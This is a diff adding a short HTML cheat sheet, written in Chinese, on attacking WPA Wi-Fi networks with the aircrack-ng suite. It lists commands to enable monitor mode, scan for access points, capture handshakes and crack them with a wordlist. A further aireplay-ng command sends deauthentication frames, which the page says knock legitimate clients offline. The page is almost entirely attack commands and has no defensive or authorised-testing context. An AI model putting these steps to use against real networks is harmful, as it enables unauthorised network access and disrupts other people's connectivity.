@@ -1,0 +1,52 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>wpa</title>
+<link href="css/css.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<table align="center"><tr><td>
+    <p><h1><font color="#FF0000">wpa</font></h1></p>
+    
+    <h2>
+    <a href="#resources">wpa</a><br />
+  	<a href="#aircrack-ng">aircrack-ng 破解步驟</a><br />
+    
+    </h2>
+    
+    <div class="div_boxex"><a name="wpa"></a><p><h3>
+    	<p><h2><font color="#FF0000">wpa</font></h2>
+      airodump-ng-oui-update
+       
+        </p>
+ 	</h3></p></div>
+   
+    <div class="div_boxex"><a name="aircrack-ng"></a><p><h3>
+    	<p><h2><font color="#FF0000">aircrack-ng 破解步驟</font></h2>        
+<pre><font color="#FF0000">step 1</font>(啟用wlan0)
+	ifconfig wlan0 up	
+<font color="#FF0000">step 2</font>(進入監聽模式)
+	airmon-ng start wlan0
+<font color="#FF0000">step 3</font>(探測ap)
+	airodump-ng mon0	
+<font color="#FF0000">step 4</font>(抓取数据包)
+	airodump-ng -w logs -c 6 mon0
+	(-w		指定保存文件名
+	-c		指定監聽通道)
+<font color="#FF0000">step 5</font>(破解)
+	aircrack-ng -w 字典文件 *.cap
+</pre>
+        </p>
+        
+        <p><h2><font color="#FF0000">deauth 攻击</font></h2>
+<pre>将合法客户踢下线 
+
+aireplay-ng -0 10 -a AP的mac -c 客户机的mac mon0  
+        </pre>
+        </p>
+  	</h3></p></div>      
+    
+</td></tr></table>
+</body>
+</html>
